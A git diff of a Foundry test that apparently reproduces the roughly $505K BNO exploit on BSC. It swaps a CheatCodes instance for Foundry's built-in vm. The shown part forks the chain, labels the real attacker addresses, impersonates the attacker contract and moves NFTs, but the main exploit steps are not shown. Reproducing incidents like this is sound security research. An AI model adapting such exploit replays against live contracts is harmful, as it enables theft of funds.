@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~$505K
 // Attacker : https://bscscan.com/address/0xa6566574edc60d7b2adbacedb71d5142cf2677fb
@@ -34,23 +33,21 @@ contract BNOTest is Test {
     address private constant attacker = 0xA6566574eDC60D7B2AdbacEdB71D5142cf2677fB;
     address private constant attackerContract = 0xD138b9a58D3e5f4be1CD5eC90B66310e241C13CD;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 30_056_629);
-        cheats.label(address(NFT), "NFT");
-        cheats.label(address(BNO), "BNO");
-        cheats.label(address(PancakePair), "PancakePair");
-        cheats.label(address(Pool), "Pool");
-        cheats.label(attacker, "Attacker");
-        cheats.label(attackerContract, "Attacker Contract");
+        vm.createSelectFork("bsc", 30_056_629);
+        vm.label(address(NFT), "NFT");
+        vm.label(address(BNO), "BNO");
+        vm.label(address(PancakePair), "PancakePair");
+        vm.label(address(Pool), "Pool");
+        vm.label(attacker, "Attacker");
+        vm.label(attackerContract, "Attacker Contract");
     }
 
     function testExploit() public {
-        cheats.startPrank(attackerContract);
+        vm.startPrank(attackerContract);
         NFT.transferFrom(attacker, address(this), 13);
         NFT.transferFrom(attacker, address(this), 14);
-        cheats.stopPrank();
+        vm.stopPrank();
 
         emit log_named_decimal_uint(
             "Attacker balance of BNO before exploit", BNO.balanceOf(address(this)), BNO.decimals()
